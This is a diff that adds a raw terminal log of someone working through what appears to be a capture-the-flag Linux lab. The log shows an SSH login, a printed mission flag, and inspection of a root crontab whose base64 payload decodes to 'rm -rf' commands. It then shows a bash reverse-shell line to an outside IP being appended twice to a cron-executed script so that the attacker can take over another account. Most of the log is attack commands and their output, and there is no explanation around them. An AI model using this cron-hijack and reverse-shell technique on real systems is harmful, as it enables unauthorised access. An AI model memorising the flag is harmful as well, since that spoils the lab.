@@ -1,0 +1,118 @@
+Script started on 2025-11-09 11:37:06+03:00 [COMMAND="ssh agent47@linux.agency.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="26"]
+agent47@linux.agency.thm's password: 
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+0 packages can be updated.
+0 updates are security updates.
+
+mission1{174dc8f191bcbb161fe25f8a5b58d1f0}
+]0;agent47@linuxagency: ~[01;32magent47@linuxagency[00m:[01;34m~[00m$ su viktor
+Password: 
+]0;viktor@linuxagency: /home/agent47[01;32mviktor@linuxagency[00m:[01;34m/home/agent47[00m$ cd
+]0;viktor@linuxagency: ~[01;32mviktor@linuxagency[00m:[01;34m~[00m$ ls -al
+total 44
+drwxr-x---  5 viktor viktor 4096 Jan 12  2021 [0m[01;34m.[0m
+drwxr-xr-x 45 root   root   4096 Jan 12  2021 [01;34m..[0m
+lrwxrwxrwx  1 viktor viktor    9 Jan 12  2021 [01;36m.bash_history[0m -> [40;33;01m/dev/null[0m
+-rw-r--r--  1 viktor viktor  220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 viktor viktor 3771 Jan 12  2021 .bashrc
+drwx------  2 viktor viktor 4096 Jan 12  2021 [01;34m.cache[0m
+-rw-r--r--  1 viktor viktor 8980 Jan 12  2021 examples.desktop
+drwx------  3 viktor viktor 4096 Jan 12  2021 [01;34m.gnupg[0m
+drwxr-xr-x  3 viktor viktor 4096 Jan 12  2021 [01;34m.local[0m
+-rw-r--r--  1 viktor viktor  807 Jan 12  2021 .profile
+]0;viktor@linuxagency: ~[01;32mviktor@linuxagency[00m:[01;34m~[00m$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+Password: 
+Sorry, user viktor may not run sudo on linuxagency.
+]0;viktor@linuxagency: ~[01;32mviktor@linuxagency[00m:[01;34m~[00m$ /cat/[K[K[K[K[Kcat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *	* * *	dalia	sleep 30;/opt/scripts/47.sh
+*  *	* * *	root	echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d > /opt/scripts/47.sh;chown viktor:viktor /opt/scripts/47.sh;chmod +x /opt/scripts/47.sh;
+#
+]0;viktor@linuxagency: ~[01;32mviktor@linuxagency[00m:[01;34m~[00m$ echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d
+#!/bin/bash
+#echo "Hello 47"
+rm -rf /dev/shm/
+#echo "Here time is a great matter of essence"
+rm -rf /tmp/
+]0;viktor@linuxagency: ~[01;32mviktor@linuxagency[00m:[01;34m~[00m$ cd /opt/scripts/
+]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ ls -al
+total 16
+drwxr-xr-x 2 root   root   4096 Jan 12  2021 [0m[01;34m.[0m
+drwxr-xr-x 4 root   root   4096 Jan 12  2021 [01;34m..[0m
+-rwxr-xr-x 1 viktor viktor  106 Nov  9 00:39 [01;32m47.sh[0m
+-r-x------ 1 jordan jordan  454 Jan 12  2021 [01;32mGun-Shop.py[0m
+]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ echo "/bin/bash -i >& /dev/tcp/10.9.0.213/6047 0>&1" >> 47.sh
+]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ cat 47.sh
+#!/bin/bash
+#echo "Hello 47"
+rm -rf /dev/shm/
+#echo "Here time is a great matter of essence"
+rm -rf /tmp/
+/bin/bash -i >& /dev/tcp/10.9.0.213/6047 0>&1
+]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ [K]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ [K]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ [K]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ [K]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ [K]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ [K]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ [K]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ su silvio
+Password: 
+su: Authentication failure
+]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ su silvio
+Password: 
+su: Authentication failure
+]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ ls- [K[K -al
+total 16
+drwxr-xr-x 2 root   root   4096 Jan 12  2021 [0m[01;34m.[0m
+drwxr-xr-x 4 root   root   4096 Jan 12  2021 [01;34m..[0m
+-rwxr-xr-x 1 viktor viktor  106 Nov  9 00:50 [01;32m47.sh[0m
+-r-x------ 1 jordan jordan  454 Jan 12  2021 [01;32mGun-Shop.py[0m
+]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ cat Gun-Shop.py 
+cat: Gun-Shop.py: Permission denied
+]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ cat 47`[K.sh
+#!/bin/bash
+#echo "Hello 47"
+rm -rf /dev/shm/
+#echo "Here time is a great matter of essence"
+rm -rf /tmp/
+]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ cat 47.shGun-Shop.py [10Pls -alsu silviocat 47.sh[52@echo "/bin/bash -i >& /dev/tcp/10.9.0.213/6047 0>&1" >>[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls -al[Kecho "/bin/bash -i >& /dev/tcp/10.9.0.213/6047 0>&1" >> 47.sh
+]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ echo "/bin/bash -i >& /dev/tcp/10.9.0.213/6047 0>&1" >> 47.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat 47.sh[K
+#!/bin/bash
+#echo "Hello 47"
+rm -rf /dev/shm/
+#echo "Here time is a great matter of essence"
+rm -rf /tmp/
+/bin/bash -i >& /dev/tcp/10.9.0.213/6047 0>&1
+]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ cat 47.sh[52@echo "/bin/bash -i >& /dev/tcp/10.9.0.213/6047 0>&1" >>[C[C[C[C[C[C
+]0;viktor@linuxagency: /opt/scripts[01;32mviktor@linuxagency[00m:[01;34m/opt/scripts[00m$ exit
+exit
+]0;agent47@linuxagency: ~[01;32magent47@linuxagency[00m:[01;34m~[00m$ exit
+logout
+Connection to linux.agency.thm closed.
+
+Script done on 2025-11-09 12:12:06+03:00 [COMMAND_EXIT_CODE="0"]
